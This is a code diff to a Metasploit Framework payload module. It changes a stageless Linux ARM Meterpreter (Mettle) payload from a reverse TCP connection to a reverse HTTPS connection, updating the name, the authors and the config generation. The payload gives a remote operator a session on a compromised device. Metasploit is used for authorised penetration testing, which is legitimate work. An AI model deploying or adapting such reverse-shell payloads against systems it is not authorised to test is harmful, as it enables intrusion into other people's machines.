@@ -3,8 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
+require 'msf/core/handler/reverse_https'
 require 'msf/base/sessions/meterpreter_options'
 require 'msf/base/sessions/mettle_config'
 require 'msf/base/sessions/meterpreter_armle_linux'
@@ -21,21 +20,23 @@ module MetasploitModule
     super(
       update_info(
         info,
-        'Name'          => 'Linux Meterpreter',
-        'Description'   => 'Run the mettle server payload (stageless)',
+        'Name'          => 'Linux Meterpreter, Reverse HTTPS Inline',
+        'Description'   => 'Run the Meterpreter / Mettle server payload (stageless)',
         'Author'        => [
-          'Adam Cammack <adam_cammack[at]rapid7.com>'
+          'Adam Cammack <adam_cammack[at]rapid7.com>',
+          'Brent Cook <brent_cook[at]rapid7.com>'
         ],
         'Platform'      => 'linux',
         'Arch'          => ARCH_ARMLE,
         'License'       => MSF_LICENSE,
-        'Handler'       => Msf::Handler::ReverseTcp,
+        'Handler'       => Msf::Handler::ReverseHttps,
         'Session'       => Msf::Sessions::Meterpreter_armle_Linux
       )
     )
   end
 
   def generate
-    MetasploitPayloads::Mettle.new('armv5l-linux-musleabi', generate_config).to_binary :exec
+    opts = {scheme: 'https'}
+    MetasploitPayloads::Mettle.new('armv5l-linux-musleabi', generate_config(opts)).to_binary :exec
   end
 end
